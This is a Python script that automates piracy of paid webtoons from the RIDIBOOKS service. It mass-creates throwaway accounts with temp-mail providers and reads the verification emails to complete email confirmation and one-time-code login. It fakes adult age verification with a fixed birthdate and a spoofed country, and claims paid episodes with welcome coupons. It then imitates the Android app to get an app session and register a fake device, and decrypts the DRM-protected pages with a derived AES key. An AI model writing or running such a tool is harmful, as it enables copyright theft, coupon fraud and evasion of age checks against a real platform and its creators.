#!/usr/bin/env python3
"""
RIDIBOOKS full-bypass farmer (zero money, no user account):
  per fresh throwaway account:
    1. tempmail.lol address
    2. signup create-account API (ridibooks.com)
    3. click activation link from mail
    4. password login -> one-time-email OTP challenge -> full web session
    5. self-cert adult (BIRTHDAY_AD_HOC for overseas geo) => 19+
    6. claim paid eps via welcome BL-webtoon FREE_RENT coupon (+ wait-free rent=0 eps)
    7. emulate android app: sso_otp leak -> device register -> stream download
       -> AES-128-ECB decrypt every page (key = sha1("stream"+b[:-6]+b)[:16])
Usage: python3 farm_ridi.py <eps_file> [how_many_accounts]
   eps_file: JSON list of [b_id, tag] pairs to collect (tag used in output dir)
State: /tmp/opencode/ridi/farm_state.json
"""
import requests, json, time, re, hashlib, os, uuid, random, string, sys, quopri
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

R = "/tmp/opencode/ridi"
WEB_UA = "Mozilla/5.0 Chrome/126 Safari/537.36"
APP_UA = "RIDIBOOKS/26.10.2_2026100678 (-onestore)"
STATE_F = f"{R}/farm_state.json"

def load_state():
    try: return json.load(open(STATE_F))
    except Exception: return {"done": {}, "accounts": []}

def save_state(st): json.dump(st, open(STATE_F, "w"))

def jprint(tag, r):
    print(f"[{tag}] {r.status_code} {str(r.text[:120]).replace(chr(10),' ')}")

# ---------- temp mail ----------
_MT_HDR = {"User-Agent": WEB_UA}
_PROVIDER_CACHE = [None]   # index of last provider RIDI accepted


def _ridi_email_ok(addr):
    """RIDI's signup-domain oracle. True/False are definitive answers; None means
    the oracle itself was unreachable and must NOT open the domain circuit."""
    last = None
    for attempt in range(4):
        try:
            r = requests.post(
                "https://ridibooks.com/apps/frontend/v1/account/validation/email",
                json={"email": addr},
                headers={"User-Agent": WEB_UA, "Origin": "https://ridibooks.com"},
                timeout=45)
            d = (r.json() or {}).get("data")
            if d is None:
                raise ValueError(str(r.text)[:80])
            return d.get("valid") is True
        except Exception as e:
            last = str(e)[:60]
            time.sleep(3 * (attempt + 1))
    print("  [email-domain oracle unreachable]", last)
    return None


_MAIL_PROVIDERS = ("tempmail", "mailtm", "tempmailio")


def _mail_state_file(key):
    pool_dir = os.environ.get("POOL_DIR", "").strip()
    if not pool_dir:
        return ""
    try:
        os.makedirs(pool_dir, exist_ok=True)
    except OSError:
        return ""
    return os.path.join(pool_dir, f"mail_state_{key}.json")


def _mail_provider_bad(idx):
    fp = _mail_state_file(f"domain_down_v2_{idx}")
    try:
        return json.load(open(fp)).get("until", 0) > time.time()
    except Exception:
        return False


def _mail_mark_domain_down(idx, ttl=1800):
    _PROVIDER_CACHE[0] = None
    fp = _mail_state_file(f"domain_down_v2_{idx}")
    try:
        json.dump({"until": time.time() + ttl}, open(fp, "w"))
    except OSError:
        pass


def _mail_mark_domain_good(idx):
    _PROVIDER_CACHE[0] = idx
    fp = _mail_state_file("domain_good_v2")
    try:
        json.dump({"idx": idx, "until": time.time() + 1800}, open(fp, "w"))
    except OSError:
        pass


def _mail_preferred_provider():
    fp = _mail_state_file("domain_good_v2")
    try:
        j = json.load(open(fp))
        if j.get("until", 0) > time.time() and 0 <= j.get("idx", -1) < len(_MAIL_PROVIDERS):
            return j["idx"]
    except Exception:
        pass
    return _PROVIDER_CACHE[0]


def _mail_bump_reject(idx):
    fp = _mail_state_file(f"rejects_v2_{idx}")
    try:
        n = int(json.load(open(fp)).get("n", 0)) + 1
    except Exception:
        n = 1
    try:
        json.dump({"n": n, "at": time.time()}, open(fp, "w"))
    except OSError:
        pass
    return n


def _mail_reset_rejects(idx):
    fp = _mail_state_file(f"rejects_v2_{idx}")
    try:
        os.remove(fp)
    except OSError:
        pass


def _gen_tempmail():
    r = requests.post("https://api.tempmail.lol/v2/inbox/create",
                      headers={"User-Agent": WEB_UA, "Accept": "application/json"},
                      timeout=30)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"tempmail http {r.status_code} {r.text[:80]}")
    try:
        a = r.json()
    except Exception:
        raise RuntimeError(f"tempmail bad-json {r.text[:80]}")
    addr, tok = a.get("address"), a.get("token")
    if not addr or not tok:
        raise RuntimeError(f"tempmail missing address {r.text[:80]}")
    return addr, tok


def _gen_mtm():
    r = requests.get("https://api.mail.tm/domains", headers=_MT_HDR, timeout=30)
    if r.status_code != 200:
        raise RuntimeError(f"mailtm domains http {r.status_code}")
    d = r.json()
    dom = d["hydra:member"][0]["domain"]
    addr = "rw" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) \
        + "@" + dom
    pw = "RidiMail" + random.choice(string.ascii_letters) + "!9x"
    hdr = {**_MT_HDR, "Content-Type": "application/json"}
    requests.post("https://api.mail.tm/accounts", headers=hdr,
                  json={"address": addr, "password": pw}, timeout=30)
    rt = requests.post("https://api.mail.tm/token", headers=hdr,
                       json={"address": addr, "password": pw}, timeout=30)
    if rt.status_code != 200:
        raise RuntimeError(f"mailtm token http {rt.status_code}")
    tok = rt.json()["token"]
    return addr, "mtm:" + tok


def _gen_tmio():
    r = requests.post("https://api.internal.temp-mail.io/api/v3/email/new",
                      headers={"User-Agent": "okhttp/4.9.1"}, timeout=20)
    if r.status_code != 200:
        raise RuntimeError(f"tmio http {r.status_code} {r.text[:80]}")
    t = r.json()
    addr, tok = t.get("email"), t.get("token")
    if not addr:
        raise RuntimeError(f"tmio missing email {r.text[:80]}")
    return addr, "tmio:" + (tok or addr)


_PROVIDERS = [_gen_tempmail, _gen_mtm, _gen_tmio]

def tmail_new():
    """provider chain with a shared RIDI-domain circuit breaker; every address
    is validated against RIDI before signup to avoid wasting accounts on banned domains"""
    order = list(range(len(_PROVIDERS)))
    k = _mail_preferred_provider()
    if k is not None and k in order:
        order.remove(k); order.insert(0, k)
    errs = []
    for idx in order:
        if _mail_provider_bad(idx):
            errs.append(f"{_MAIL_PROVIDERS[idx]}:domain-circuit")
            continue
        for att in range(5):
            try:
                addr, tok = _PROVIDERS[idx]()
                ok = _ridi_email_ok(addr)
                if ok is True:
                    _mail_reset_rejects(idx)
                    _mail_mark_domain_good(idx)
                    return addr, tok
                if ok is False:
                    n = _mail_bump_reject(idx)
                    errs.append(f"{_MAIL_PROVIDERS[idx]}:domain-rejected:{n}")
                    if n >= 3:
                        _mail_mark_domain_down(idx, 1800)
                        break
                    continue
                errs.append(f"{_MAIL_PROVIDERS[idx]}:oracle-unreachable")
            except Exception as e:
                reason = str(e)[:70]
                errs.append(f"{_MAIL_PROVIDERS[idx]}:{reason}")
                if "http 429" in reason or "too many" in reason.lower():
                    time.sleep(min(20, 5 * (att + 1)) + random.uniform(0, 2))
                else:
                    time.sleep(2 * (att + 1) + random.uniform(0, 1))
    raise RuntimeError("all mail providers failed: " + "; ".join(errs[:6]))


def _mtm_poll(token, want_otp=False):
    h = {**_MT_HDR, "Authorization": "Bearer " + token[4:]}
    ms = []
    for _t in range(6):
        try:
            j = requests.get("https://api.mail.tm/messages", headers=h,
                             timeout=30).json()
            ms = j.get("hydra:member") or []
            break
        except Exception as e:
            print("  [mtm poll retry]", str(e)[:80]); time.sleep(20)
    if not ms:
        return None
    mid = max(ms, key=lambda x: x.get("createdAt") or "")["id"]
    full = requests.get(f"https://api.mail.tm/messages/{mid}", headers=h,
                        timeout=30).json()
    body = (full.get("text") or "") + (full.get("html") or "")
    dec = quopri.decodestring(body.encode()).decode("utf-8", "ignore")
    if want_otp:
        cs = re.findall(r"\b\d{6}\b", re.sub("<[^>]+>", " ", dec))
        return ("otp", cs[0]) if cs else None
    fs = re.findall(r'href="(https?://[^"]+verify[^"]*)"', dec)
    return ("link", fs[0].replace("&amp;", "&")) if fs else None


def _tmio_poll(token, want_otp=False):
    ms = []
    for _t in range(6):
        try:
            r = requests.get(f"https://api.internal.temp-mail.io/api/v3/email/"
                             f"{token[5:]}/messages",
                             headers={"User-Agent": "okhttp/4.9.1"}, timeout=20)
            ms = r.json() or []
            break
        except Exception as e:
            print("  [tmio poll retry]", str(e)[:80]); time.sleep(15)
    if not ms:
        return None
    m = max(ms, key=lambda x: str(x.get("received_at") or ""))
    body = (m.get("body_text") or "") + (m.get("body_html") or "")
    dec = quopri.decodestring(body.encode()).decode("utf-8", "ignore")
    if want_otp:
        cs = re.findall(r"\b\d{6}\b", re.sub("<[^>]+>", " ", dec))
        return ("otp", cs[0]) if cs else None
    fs = re.findall(r'href="(https?://[^"]+verify[^"]*)"', dec)
    return ("link", fs[0].replace("&amp;", "&")) if fs else None


def tmail_poll(token, want_otp=False):
    if token.startswith("mtm:"):
        return _mtm_poll(token, want_otp)
    if token.startswith("tmio:"):
        return _tmio_poll(token, want_otp)
    for _t in range(8):
        try:
            r = requests.get(f"https://api.tempmail.lol/auth/{token}",
                             headers={"User-Agent": WEB_UA}, timeout=45)
            j = r.json()
            break
        except Exception as e:
            print("  [tmail retry]", str(e)[:80])
            time.sleep(3 + random.uniform(0, 2))
    else:
        return None
    ms = j.get("email") or []
    if not ms: return None
    m = max(ms, key=lambda x: str(x.get("received") or ""))
    body = (m.get("body") or "") + (m.get("html") or "")
    dec = quopri.decodestring(body.encode()).decode("utf-8", "ignore")
    if want_otp:
        cs = re.findall(r"\b\d{6}\b", re.sub("<[^>]+>", " ", dec))
        return ("otp", cs[0]) if cs else None
    fs = re.findall(r'href="(https?://[^"]+verify[^"]*)"', dec)
    return ("link", fs[0].replace("&amp;", "&")) if fs else None

# ---------- account creation ----------
def _rpost(session, url, **kw):
    for attempt in range(3):
        try:
            return session.post(url, **kw)
        except (requests.Timeout, requests.ConnectionError):
            if attempt == 2:
                raise
            time.sleep(2 * (attempt + 1))


def _rget(session, url, **kw):
    for attempt in range(3):
        try:
            return session.get(url, **kw)
        except (requests.Timeout, requests.ConnectionError):
            if attempt == 2:
                raise
            time.sleep(2 * (attempt + 1))


def signup(addr):
    s = requests.Session()
    s.headers.update({"User-Agent": WEB_UA, "Origin": "https://ridibooks.com",
                      "Referer": "https://ridibooks.com/account/signup/form"})
    uid = "rw" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
    pw = "Ridi" + "".join(random.choices(string.ascii_letters + string.digits, k=8)) + "!1"
    for path, payload in (("validation/id", {"user_id": uid}),
                          ("validation/email", {"email": addr})):
        j = _rpost(s, f"https://ridibooks.com/apps/frontend/v1/account/{path}",
                   json=payload, timeout=45).json().get("data", {})
        if not j.get("valid"):
            print("  validation failed:", path, (j.get("messages") or [""])[0][:50])
            return None, None, None
    payload = {"user_id": uid, "password": pw, "password_reenter": pw,
               "email": addr, "name": random.choice(["Kim","Park","Lee"])+" "+random.choice(["Minseok","Jihoon","Yuna"]),
               "birth_year": str(random.randint(1985, 2002)), "gender": random.choice(["M", "F"]),
               "use_confirm": True, "consent_confirm": True,
               "provide_gender_and_birth_confirm": True,
               "marketing_agreement_push_confirm": False}
    # Deliberately do NOT retry this call: a timed-out request may already have
    # created the account, and the caller will restart with a fresh email.
    r = s.post("https://ridibooks.com/apps/frontend/v1/account/signup/create-account",
               json=payload, timeout=70)
    ok = r.ok and '"valid":true' in r.text.replace(" ", "")
    if not ok:
        print("  create-account failed:", str(r.text[:120]).replace("\n", " "))
        return None, None, None
    # trigger activation mail ourselves (create-account does NOT send it)
    _rget(s, f"https://ridibooks.com/account/email/send?return_url=%2F&email="
              f"{requests.utils.quote(addr)}", timeout=45)
    sent = False
    for attempt in range(4):
        rr = _rpost(s, "https://ridibooks.com/apps/frontend/v1/account/verification/send-email",
                    json={"email": addr, "return_url": "/"}, timeout=45)
        j = rr.json() if rr.ok else {}
        d = j.get("data") or {}
        if d.get("valid"):
            sent = True; break
        msg = (d.get("messages") or [""])[0] or str(j)[:80]
        if "30초" in msg: time.sleep(32); continue
        print("  send-email rejected:", msg[:60]); break
    ck = {c.name: c.value for c in s.cookies}
    return (uid, pw, ck) if sent and ok else (None, None, None)

def activate(link):
    last = ""
    for attempt in range(3):
        try:
            s = requests.Session()
            s.headers["User-Agent"] = WEB_UA
            g = s.get(link, timeout=70, allow_redirects=True)
            return "signup/complete" in g.url
        except Exception as e:
            last = str(e)[:70]
            print("  activation request failed:", last)
            time.sleep(3 * (attempt + 1))
    return False

# ---------- login + otp ----------
def full_login(uid, pw):
    try:
        s = requests.Session()
        s.headers.update({"User-Agent": WEB_UA, "Referer": "https://ridibooks.com/account/login",
                          "Origin": "https://ridibooks.com"})
        _rget(s, "https://ridibooks.com/account/login", timeout=45)
        fd = {"username": uid, "password": pw, "platform_from": "web",
              "auto_login": "false", "id_token": "", "platform": "", "user_name": ""}
        r = _rpost(s, "https://ridibooks.com/auth/login/password", data=fd,
                   timeout=70, allow_redirects=False)
        if not (300 <= r.status_code < 400):
            return None
        loc = r.headers.get("location", "")
        if "one-time-email" not in loc:
            return None
        _rget(s, "https://ridibooks.com" + loc if not loc.startswith("http") else loc, timeout=45)
        sr = _rpost(s, "https://ridibooks.com/apps/books/auth/mfa/email/send", timeout=45)
        if not sr.ok:
            return None
        time.sleep(12)
        for _ in range(12):
            got = tmail_poll(TMAIL_TOKEN[0], want_otp=True)
            if got:
                code = got[1]
                rr = _rpost(s, "https://ridibooks.com/auth/mfa/challenge",
                            data={"method": "email_otp", "code": code,
                                  "platform_from": "web", "purpose": "login"},
                            timeout=70, allow_redirects=False)
                if not (300 <= rr.status_code < 400):
                    return None
                nloc = rr.headers["location"]
                _rget(s, nloc if nloc.startswith("http") else "https://ridibooks.com" + nloc,
                      timeout=70, allow_redirects=True)
                ck = {c.name: c.value for c in s.cookies}
                me = requests.Session(); me.cookies.update(ck); me.headers["User-Agent"] = WEB_UA
                m2 = _rget(me, "https://ridibooks.com/apps/account/accounts/me", timeout=30)
                if '"idx"' in m2.text:
                    return ck
            time.sleep(7)
        return None
    except (requests.Timeout, requests.ConnectionError) as e:
        print("  login network error:", str(e)[:70])
        return None

TMAIL_TOKEN = [None]

# ---------- adult self-cert ----------
def verify_adult(w):
    r = w.post("https://ridibooks.com/apps/books/api/csrf-token", timeout=30)
    if r.headers.get("x-csrf-token"): w.headers["X-CSRF-TOKEN"] = r.headers["x-csrf-token"]
    v = w.post("https://ridibooks.com/apps/books/api/account/verify-adult/birthday-ad-hoc/verify",
               json={"birthDate": "1994-05-17", "ipCountry": "TH"}, timeout=25)
    j = v.json() if v.ok else {}
    return j.get("is_verified_adult") is True

# ---------- claims ----------
def route_claims(w, bids):
    claimed = []
    for bid in bids:
        q = {"b_ids[0]": bid, "pay_object": "rent", "return_url": "",
             "return_url_at_fail": "", "is_prefer_return_api_endpoint": "true", "is_v2": "true"}
        try:
            rp = _rget(w, "https://ridibooks.com/apps/books/api/payment/route/book",
                       params=q, timeout=60)
        except (requests.Timeout, requests.ConnectionError) as e:
            print(f"    route err {bid}: {str(e)[:60]}")
            continue
        if rp.status_code == 400 and "구매할 수 없습니다" in (rp.text or ""):
            # RIDI blocks THIS episode at payment layer (Selection-only lock) —
            # distinct from 'no coupon left'; report once per bid
            print(f"    PURCHASE_LOCK {bid}", flush=True)
            continue
        if rp.status_code != 200:
            continue
        j = rp.json()
        info = (j.get("payment_book_cash_and_point") or {}).get("information") or {}
        try:
            if str(info.get("total_price")) == "0":
                params = (j.get("payment_book_cash_and_point") or {}).get("parameters")
                pr = _rpost(w, "https://ridibooks.com/api/payment/request", data=params,
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=60)
                if pr.ok and '"t_id"' in pr.text: claimed.append(bid); print(f"  claim(free) {bid}")
            elif j.get("coupons"):
                c = j["coupons"][0]
                pr = _rpost(w, c["link"], data=c["parameters"],
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=60)
                if pr.ok and '"t_id"' in pr.text: claimed.append(bid); print(f"  claim(coupon) {bid}")
        except (requests.Timeout, requests.ConnectionError) as e:
            print(f"    claim err {bid}: {str(e)[:60]}")
        else:
            # no coupon left / owned
            pass
        time.sleep(1.2)
    return claimed

# ---------- app download ----------
def page_key(b):
    s = "stream" + b[:max(len(b)-6, 0)] + b
    return hashlib.sha1(s.encode()).hexdigest()[:16].encode()

PAGE_WORKERS = int(os.environ.get("PAGE_WORKERS") or 16)
JIT_LO, JIT_HI = (lambda a, b: (a, b))(
    *(float(x) for x in os.environ.get("PAGE_JITTER", "0.3-1.2").split("-", 1)))


def _session_json(session, method, url, tries=3, timeout=20, **kw):
    for attempt in range(tries):
        try:
            r = getattr(session, method)(url, timeout=timeout, **kw)
            if r.status_code != 200:
                print(f"  [ridi json retry] {r.status_code} {url.split('/')[3]} "
                      f"{(r.text or '')[:90]}")
            else:
                try:
                    return r.json()
                except ValueError:
                    print(f"  [ridi json retry] non-json {url.split('/')[3]} "
                          f"{(r.text or '')[:90]}")
        except requests.RequestException as e:
            print(f"  [ridi json retry] {type(e).__name__} {str(e)[:80]}")
        time.sleep(2 * (attempt + 1))
    return None


def app_download(w, bids, outroot=None, dev=None):
    outroot = outroot or f"{R}/dl_farm"
    if not bids:
        return []
    leak_j = _session_json(w, "post",
        "https://ridibooks.com/api/user_books/trigger_download",
        tries=3, timeout=30,
        json={"b_ids": [str(x) for x in bids], "preprocess": True},
        headers={"Origin": "https://ridibooks.com",
                 "Referer": "https://ridibooks.com/library"})
    leak = (leak_j or {}).get("url") or (leak_j or {}).get("uri_scheme") or ""
    if "sso_otp=" not in leak:
        legacy = _session_json(w, "get",
            "https://ridibooks.com/library/get-app-purchased-list-uri-scheme",
            tries=2, timeout=30)
        leak = (legacy or {}).get("uri_scheme") or ""
    if "sso_otp=" not in leak:
        print("  [app auth] no sso_otp in purchased-list uri_scheme")
        return []
    otp_j = _session_json(w, "post", "https://account.ridibooks.com/sso/otp",
                          tries=3, timeout=30, json={"sso_otp": leak.split("sso_otp=")[-1]})
    otp = (otp_j or {}).get("otp")
    if not otp:
        print("  [app auth] OTP exchange failed")
        return []
    a = requests.Session(); a.headers["User-Agent"] = APP_UA
    rr = a.get(f"https://account.ridibooks.com/sso/login?otp={otp}&device_id={dev}",
               allow_redirects=False, timeout=25)
    at = a.cookies.get("ridi-at", domain=".ridibooks.com")
    if not at: return []
    a.post("https://account.ridibooks.com/api/user-devices",
           data=json.dumps({"device_id": dev, "device_code": "Android",
                            "device_nick": "SM-G991B"}),
           headers={"Authorization": "Bearer " + at,
                    "Content-Type": "application/json"}, timeout=25)
    got = []
    for bid in bids:
        try:
            meta = _session_json(a, "get",
                f"https://download.ridibooks.com/stream/books/{bid}/files/metadata"
                f"?device_id={dev}&quality=recommended",
                tries=3, timeout=30)
            if meta is None:
                print(f"  [meta {bid}] unavailable"); continue
            imgs = (meta.get("content_images") or [])
            outdir = os.path.join(outroot, bid); os.makedirs(outdir, exist_ok=True)
            k = page_key(bid); n = 0; f = 0

            def _fetch(i):
                # NEVER fetch type=cover into ep zips (series banner, identical
                # across eps — user complaint). Content pages index 0-based.
                u = (f"https://download.ridibooks.com/stream/books/{bid}/files"
                     f"?page_num={i}&type=content&quality=recommended&device_id={dev}")
                last = None
                for att in range(4):
                    try:
                        time.sleep(random.uniform(JIT_LO, JIT_HI))
                        return i, a.get(u, timeout=90)
                    except requests.RequestException as e:
                        last = e
                        time.sleep(2 ** att + random.random())
                raise last

            from concurrent.futures import ThreadPoolExecutor
            missing = set()
            with ThreadPoolExecutor(PAGE_WORKERS) as pool:
                for i, r2 in pool.map(_fetch, range(len(imgs))):
                    if r2.status_code != 200 or len(r2.content) < 300:
                        f += 1; missing.add(i); continue
                    d = Cipher(algorithms.AES(k), modes.ECB(), backend=default_backend()).decryptor()
                    pt = d.update(r2.content) + d.finalize()
                    ext = ".jpg" if pt[0:3] == b"\xff\xd8\xff" else ".webp"
                    open(os.path.join(outdir, f"{i+1:03d}{ext}"), "wb").write(pt); n += 1
        except Exception as e:
            print(f"  [dl {bid}] err {str(e)[:140]}"); continue
        # gap-repair pass: failed slots get slow sequential retries so no page hole
        try:
            for i in sorted(missing):
                u = (f"https://download.ridibooks.com/stream/books/{bid}/files"
                     f"?page_num={i}&type=content&quality=recommended&device_id={dev}")
                ok = False
                for att in range(3):
                    time.sleep(random.uniform(JIT_LO, JIT_HI))
                    try:
                        r2 = a.get(u, timeout=90)
                    except requests.RequestException:
                        continue
                    if r2.status_code != 200 or len(r2.content) < 300:
                        continue
                    d = Cipher(algorithms.AES(k), modes.ECB(), backend=default_backend()).decryptor()
                    pt = d.update(r2.content) + d.finalize()
                    ext = ".jpg" if pt[0:3] == b"\xff\xd8\xff" else ".webp"
                    open(os.path.join(outdir, f"{i+1:03d}{ext}"), "wb").write(pt)
                    n += 1; ok = True; break
                if not ok:
                    print(f"  [gap {bid}] page_num={i} still missing", flush=True)
        except Exception as e:
            print(f"  [gap {bid}] err {str(e)[:120]}")
        print(f"  ✔ {bid}: {n}/{len(imgs)} pages")
        got.append({"b_id": bid, "pages": n})
    return got

# ---------- main ----------
if __name__ == "__main__":
    eps_file = sys.argv[1]
    n_accounts = int(sys.argv[2]) if len(sys.argv) > 2 else 3
    targets = json.load(open(eps_file))
    st = load_state()
    remaining = [b for b in targets if str(b) not in st["done"]]
    print("targets left:", len(remaining))
    dev = str(uuid.uuid4())
    for acc in range(n_accounts):
        try:
            addr, tok = tmail_new(); TMAIL_TOKEN[0] = tok
            print(f"=== account #{acc+1} {addr}")
            uid, pw, ck0 = signup(addr)
            if not uid:
                save_state(st); continue
            time.sleep(10)
            link = None
            for _ in range(14):
                time.sleep(6)
                g = tmail_poll(tok)
                if g and g[0] == "link": link = g[1]; break
            if not link or not activate(link):
                print("  activation failed"); continue
            wck = full_login(uid, pw)
            if not wck: print("  login/otp failed"); continue
            w = requests.Session(); w.cookies.update(wck); w.headers["User-Agent"] = WEB_UA
            if not verify_adult(w): print("  adult verify failed")
            claimed = route_claims(w, remaining[:60])
            # dedupe
            claimed = [c for c in dict.fromkeys(claimed)]
            if claimed:
                got = app_download(w, claimed, dev=dev)
                for g in got:
                    st["done"][str(g["b_id"])] = {"pages": g["pages"], "acct": uid}
                st["accounts"].append({"uid": uid, "pw": pw, "email": addr,
                                       "claims": claimed})
        except Exception as e:
            print(f"  account error: {str(e)[:150]}")
        save_state(st)
        remaining = [b for b in targets if str(b) not in st["done"]]
        print(f"state: done={len(st['done'])} left={len(remaining)}")
        if not remaining:
            print("ALL TARGETS COLLECTED"); break
